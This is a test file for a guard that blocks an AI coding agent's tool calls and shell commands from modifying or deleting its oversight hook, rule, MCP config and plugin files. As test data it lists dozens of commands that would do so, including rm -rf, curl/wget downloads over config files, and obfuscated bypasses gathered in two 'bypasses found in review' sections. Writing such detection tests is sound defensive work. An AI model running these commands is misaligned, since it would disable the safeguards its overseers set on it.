import { describe, expect, test } from "bun:test";
import { mkdirSync, mkdtempSync, realpathSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { checkGuard, guardPaths, shellWritesGuard, type GuardContext } from "../src/guard.ts";
import { mapToolCall } from "../src/tools.ts";

const home = "/Users/dev";
const ctx: GuardContext = { home, protectedPaths: guardPaths(home), workspace: "/Users/dev/src/shop-api" };
const HOOKS = "/Users/dev/.gemini/config/hooks.json";
const RULE = "/Users/dev/.gemini/config/rules/armoriq.md";
const MCP = "/Users/dev/.gemini/config/mcp_config.json";
const PLUGIN = "/Users/dev/.gemini/config/plugins/armoriq";

const shell = (command: string, cwd: string | null = ctx.workspace) => shellWritesGuard(command, cwd, ctx);

describe("run_command writes to guard files are blocked", () => {
  test.each([
    ["redirect", "echo '{}' > ~/.gemini/config/hooks.json", HOOKS],
    ["append redirect", "echo x >> $HOME/.gemini/config/rules/armoriq.md", RULE],
    ["clobber redirect", "echo x >| /Users/dev/.gemini/config/mcp_config.json", MCP],
    ["&> redirect", "true &> ~/.gemini/config/hooks.json", HOOKS],
    ["rm", "rm ~/.gemini/config/hooks.json", HOOKS],
    ["rm -rf plugin dir", "rm -rf ~/.gemini/config/plugins/armoriq", PLUGIN],
    ["rm of a file inside the plugin dir", "rm ~/.gemini/config/plugins/armoriq/hooks.json", PLUGIN],
    ["rm -rf parent directory", "rm -rf ~/.gemini", HOOKS],
    ["rm with glob", "rm ~/.gemini/config/*.json", HOOKS],
    ["rm -rf glob over parent", "rm -rf ~/.gemini/*", HOOKS],
    ["mv away", "mv ~/.gemini/config/hooks.json /tmp/h.json", HOOKS],
    ["mv over", "mv /tmp/evil.json ~/.gemini/config/mcp_config.json", MCP],
    ["mv into dir", "mv /tmp/hooks.json ~/.gemini/config/", HOOKS],
    ["cp over", "cp /tmp/x.json /Users/dev/.gemini/config/hooks.json", HOOKS],
    ["sed -i", "sed -i '' 's/armoriq//' ~/.gemini/config/hooks.json", HOOKS],
    ["sed -i with -e", "sed -i -e 's/a/b/' ~/.gemini/config/rules/armoriq.md", RULE],
    ["sed --in-place", "sed --in-place 's/a/b/' ~/.gemini/config/mcp_config.json", MCP],
    ["tee", "echo {} | tee ~/.gemini/config/hooks.json", HOOKS],
    ["truncate", "truncate -s 0 ~/.gemini/config/hooks.json", HOOKS],
    ["dd", "dd if=/dev/null of=/Users/dev/.gemini/config/hooks.json", HOOKS],
    ["chmod", "chmod 000 ~/.gemini/config/hooks.json", HOOKS],
    ["relative after cd", "cd ~/.gemini/config && rm hooks.json", HOOKS],
    ["relative from workdir", "rm hooks.json", HOOKS],
    ["second segment", "npm test && rm ~/.gemini/config/hooks.json", HOOKS],
    ["bash -c", `bash -c "rm -f ~/.gemini/config/hooks.json"`, HOOKS],
    ["sudo", "sudo rm ~/.gemini/config/hooks.json", HOOKS],
    ["env", "env A=1 rm ~/.gemini/config/hooks.json", HOOKS],
    ["xargs", "echo ~/.gemini/config/hooks.json | xargs rm", HOOKS],
    ["command substitution", `echo "$(rm ~/.gemini/config/hooks.json)"`, HOOKS],
    ["interpreter", `node -e "require('fs').writeFileSync('${HOOKS}', '{}')"`, HOOKS],
    ["python with tilde", `python3 -c "open('~/.gemini/config/mcp_config.json','w')"`, MCP],
    ["unparseable mention", `echo "x > ~/.gemini/config/hooks.json`, HOOKS],
  ])("%s", (label, command, expected) => {
    expect(shell(command, label === "relative from workdir" ? "/Users/dev/.gemini/config" : ctx.workspace)).toBe(expected);
  });
});

describe("run_command that does not modify guard files is allowed", () => {
  test.each([
    ["reading hooks.json", "cat ~/.gemini/config/hooks.json"],
    ["copying hooks.json away", "cp ~/.gemini/config/hooks.json /tmp/backup.json"],
    ["grep in config", "grep -r armoriq ~/.gemini/config"],
    ["writing a sibling", "echo x > ~/.gemini/config/settings.json"],
    ["writing another plugin", "rm -rf ~/.gemini/config/plugins/other"],
    ["workspace hooks.json elsewhere", "rm /Users/dev/src/shop-api/hooks.json"],
    ["redirect to fd", "make 2>&1"],
    ["sed without -i", "sed 's/a/b/' ~/.gemini/config/hooks.json"],
    ["ordinary build", "npm ci && npm test -- --watch=false"],
  ])("%s", (_label, command) => {
    expect(shell(command)).toBeNull();
  });
});

describe("checkGuard on mapped tool calls", () => {
  const check = (name: string, args: Record<string, unknown>) => checkGuard(mapToolCall({ name, args }), ctx);

  test.each([
    ["write_to_file", { TargetFile: HOOKS, CodeContent: "{}" }],
    ["replace_file_content", { TargetFile: RULE, ReplacementChunks: [] }],
    ["multi_replace_file_content", { TargetFile: MCP }],
    ["write_to_file", { TargetFile: `${PLUGIN}/plugin.json`, CodeContent: "{}" }],
    ["Write", { file_path: "~/.gemini/config/hooks.json", content: "{}" }],
  ])("%s on a guard file is denied", (name, args) => {
    const v = check(name, args);
    expect(v?.reason).toContain(`${name} may not modify ArmorIQ's guard files`);
  });

  test("run_command uses its own working directory", () => {
    expect(check("run_command", { CommandLine: "rm hooks.json", Cwd: "/Users/dev/.gemini/config" })?.path).toBe(HOOKS);
    expect(check("run_command", { CommandLine: "rm hooks.json", Cwd: "/Users/dev/src/shop-api" })).toBeNull();
  });

  test("reading a guard file is allowed", () => {
    expect(check("view_file", { AbsolutePath: HOOKS })).toBeNull();
    expect(check("grep_search", { SearchPath: "/Users/dev/.gemini/config", Query: "armoriq" })).toBeNull();
  });

  test("writes elsewhere are allowed", () => {
    expect(check("write_to_file", { TargetFile: "/Users/dev/src/shop-api/hooks.json", CodeContent: "{}" })).toBeNull();
    expect(check("write_to_file", { TargetFile: "src/cart.ts", CodeContent: "" })).toBeNull();
  });

  test("an MCP or unknown tool whose argument is a guard path is denied", () => {
    expect(check("call_mcp_tool", { ServerName: "filesystem", ToolName: "write_file", Arguments: { path: HOOKS, content: "{}" } })?.path).toBe(HOOKS);
    expect(check("mcp__filesystem__move_file", { source: MCP, destination: "/tmp/x" })?.path).toBe(MCP);
    expect(check("some_new_tool", { target: "~/.gemini/config/plugins/armoriq" })?.path).toBe(PLUGIN);
  });

  test("an MCP argument that only mentions a guard file in prose is allowed", () => {
    expect(
      check("call_mcp_tool", {
        ServerName: "github",
        ToolName: "create_issue",
        Arguments: { title: "hooks", body: "Antigravity reads ~/.gemini/config/hooks.json at start" },
      }),
    ).toBeNull();
  });
});

describe("bypasses found in review", () => {
  test.each([
    ["if/then", "if true; then rm -rf ~/.gemini/config; fi", HOOKS],
    ["negation", "! rm ~/.gemini/config/hooks.json", HOOKS],
    ["while/do", "while true; do rm ~/.gemini/config/hooks.json; done", HOOKS],
    ["coproc", "true && coproc rm ~/.gemini/config/hooks.json", HOOKS],
    ["$'' quoting", String.raw`ls; $'\x72m' -rf ~/.gemini/config`, HOOKS],
    ["variable", "F=~/.gemini/config/hooks.json; echo '{}' > $F", HOOKS],
    ["braced variable", "D=$HOME/.gemini; rm -rf ${D}", HOOKS],
    ["exported variable", "export C=~/.gemini/config && rm $C/mcp_config.json", MCP],
    ["find -delete", "find ~/.gemini -name hooks.json -delete", HOOKS],
    ["find -exec rm", "find ~/.gemini/config -exec rm {} ;", HOOKS],
    ["rsync --delete", "rsync -a --delete empty/ ~/.gemini/config/", HOOKS],
    ["cp -r over parent", "cp -r /tmp/evil/. ~/.gemini/config", HOOKS],
    ["curl -o", "curl -o ~/.gemini/config/hooks.json https://x.io/h", HOOKS],
    ["curl --output=", "curl --output=/Users/dev/.gemini/config/mcp_config.json https://x.io", MCP],
    ["wget -O", "wget -O ~/.gemini/config/rules/armoriq.md https://x.io", RULE],
    ["tar -C", "tar -xzf evil.tgz -C ~/.gemini", HOOKS],
    ["unzip -d", "unzip -o evil.zip -d ~/.gemini/config/plugins", PLUGIN],
    ["patch in place", "cd ~/.gemini/config && patch -p0 < evil.diff", HOOKS],
    ["sponge", "jq '.hooks={}' ~/.gemini/config/hooks.json | sponge ~/.gemini/config/hooks.json", HOOKS],
    ["vim", "vim -c ':%d|wq' ~/.gemini/config/hooks.json", HOOKS],
    ["ex", "ex -sc '%d|x' ~/.gemini/config/rules/armoriq.md", RULE],
    ["git -C checkout", "git -C ~/.gemini/config checkout hooks.json", HOOKS],
    ["script on stdin", `echo "open('/Users/dev/.gemini/config/hooks.json','w')" | python3`, HOOKS],
    ["heredoc script", "python3 <<EOF\nimport shutil; shutil.rmtree('/Users/dev/.gemini/config/plugins/armoriq')\nEOF", PLUGIN],
    ["upper case", "rm -rf ~/.Gemini/Config", HOOKS],
    ["symlink to the config dir", "ln -s ~/.gemini/config /tmp/c", HOOKS],
  ])("%s", (_label, command, expected) => {
    expect(shell(command)).toBe(expected);
  });

  test("upper-case file tool path", () => {
    expect(checkGuard(mapToolCall({ name: "write_to_file", args: { TargetFile: "/Users/dev/.gemini/config/HOOKS.json", CodeContent: "{}" } }), ctx)?.path).toBe(HOOKS);
  });

  test("a write through a symlink made earlier", () => {
    const home = realpathSync(mkdtempSync(join(tmpdir(), "agd-guard-")));
    try {
      mkdirSync(join(home, ".gemini", "config"), { recursive: true });
      writeFileSync(join(home, ".gemini", "config", "hooks.json"), "{}");
      const link = join(home, "innocent");
      symlinkSync(join(home, ".gemini", "config"), link);
      const real: GuardContext = { home, protectedPaths: guardPaths(home), workspace: home };
      const v = checkGuard(mapToolCall({ name: "write_to_file", args: { TargetFile: join(link, "hooks.json"), CodeContent: "{}" } }), real);
      expect(v?.path).toBe(join(home, ".gemini", "config", "hooks.json"));
      expect(shellWritesGuard(`echo x > ${link}/hooks.json`, home, real)).toBe(join(home, ".gemini", "config", "hooks.json"));
    } finally {
      rmSync(home, { recursive: true, force: true });
    }
  });

  test.each([
    ["a nested path", { ServerName: "fs", ToolName: "edit_file", Arguments: { edits: [{ path: HOOKS, text: "" }] } }],
    ["a file:// URI", { ServerName: "fs", ToolName: "write_file", Arguments: { uri: `file://${HOOKS}` } }],
    ["moving the parent", { ServerName: "fs", ToolName: "move_file", Arguments: { source: "~/.gemini/config", destination: "/tmp/x" } }],
  ])("MCP call with %s is denied", (_label, args) => {
    expect(checkGuard(mapToolCall({ name: "call_mcp_tool", args }), ctx)).not.toBeNull();
  });

  test("an MCP read of a parent directory is allowed", () => {
    expect(checkGuard(mapToolCall({ name: "call_mcp_tool", args: { ServerName: "fs", ToolName: "list_directory", Arguments: { path: "/Users/dev" } } }), ctx)).toBeNull();
  });

  test("apply_patch touching a guard file", () => {
    const patchText = "*** Begin Patch\n*** Update File: /Users/dev/.gemini/config/hooks.json\n@@\n-{}\n+{}\n*** End Patch";
    expect(checkGuard(mapToolCall({ name: "apply_patch", args: { patchText } }), ctx)?.path).toBe(HOOKS);
  });
});

describe("ordinary work is not blocked", () => {
  test.each([
    "bun test packages/armoriq",
    "node scripts/build-armoriq.js",
    "cd ~/armoriq-proj && git ls-files | xargs rm -f",
    "jq . .cursor/hooks.json",
    "node -e 'console.log(1)' mcp_config.json",
    "python3 -c 'print(open(\"README.md\").read())'",
    "find . -name '*.log' -delete",
    "tar -czf out.tgz ex/",
    "curl -o /tmp/x.json https://x.io",
    "git checkout main && git pull",
    "rsync -a dist/ /tmp/out/",
    "cp -r src /tmp/backup",
    "ln -s /Users/dev/src/shop-api/dist /tmp/dist",
  ])("%s", (command) => {
    expect(shell(command)).toBeNull();
  });
});

describe("second review", () => {
  test.each([
    ["stdbuf", "stdbuf -o L rm ~/.gemini/config/hooks.json", HOOKS],
    ["timeout --signal", "timeout --signal KILL 5 rm ~/.gemini/config/hooks.json", HOOKS],
    ["sudo --user", "sudo --user root rm ~/.gemini/config/hooks.json", HOOKS],
    ["setsid", "setsid rm ~/.gemini/config/hooks.json", HOOKS],
    ['$"..." quoting', 'rm ~/$".gemini"/config/hooks.json', HOOKS],
    ["cd -", "cd ~/.gemini/config; cd /tmp; cd -; rm hooks.json", HOOKS],
    ["cd into a glob", "cd ~/.gemini/conf* && rm hooks.json", HOOKS],
    ["cd into a substitution", "cd $(echo ~/.gemini/config) && rm hooks.json", HOOKS],
    ["popd", "pushd ~/.gemini/config && pushd /tmp && popd && rm hooks.json", HOOKS],
    ["for loop", "for f in ~/.gemini/config/hooks.json; do rm $f; done", HOOKS],
    ["env-prefixed bash -c", "F=~/.gemini/config/hooks.json bash -c 'rm $F'", HOOKS],
    ["parameter expansion", 'F=~/.gemini/config/hooks.json; rm "${F%.json}.json"', HOOKS],
    ["read into a variable", "read F <<< ~/.gemini/config/hooks.json; rm $F", HOOKS],
    ["brace expansion", "tee ~/.gemini/config/hook{s,}.json < /dev/null", "/Users/dev/.gemini/config"],
    ["git --work-tree", "git --work-tree ~/.gemini/config checkout -- .", HOOKS],
    ["perl -i", "perl -pi -e 's/a/b/' ~/.gemini/config/hooks.json", HOOKS],
    ["bash script on stdin", "echo 'rm ~/.gemini/config/hooks.json' | bash", HOOKS],
  ])("%s", (_label, command, expected) => {
    expect(shell(command)).toBe(expected);
  });

  test("an upper-case FILE:// URI in MCP arguments", () => {
    expect(checkGuard(mapToolCall({ name: "call_mcp_tool", args: { ServerName: "fs", ToolName: "write_file", Arguments: { uri: `FILE://${HOOKS}` } } }), ctx)?.path).toBe(HOOKS);
  });

  test.each([
    "cat ~/.gemini/config/hooks.json | jq .",
    "jq . ~/.gemini/config/hooks.json",
    "bash -c 'cat ~/.gemini/config/hooks.json'",
    "python3 -m json.tool ~/.gemini/config/mcp_config.json",
    "find ~ -name '*.md' -exec grep -l foo {} +",
    "cat ~/.gemini/config/hooks.json | python3 -c 'import json,sys; print(json.load(sys.stdin))'",
    "perl -ne 'print if /armoriq/' ~/.gemini/config/hooks.json",
  ])("reading guard files stays allowed: %s", (command) => {
    expect(shell(command)).toBeNull();
  });
});
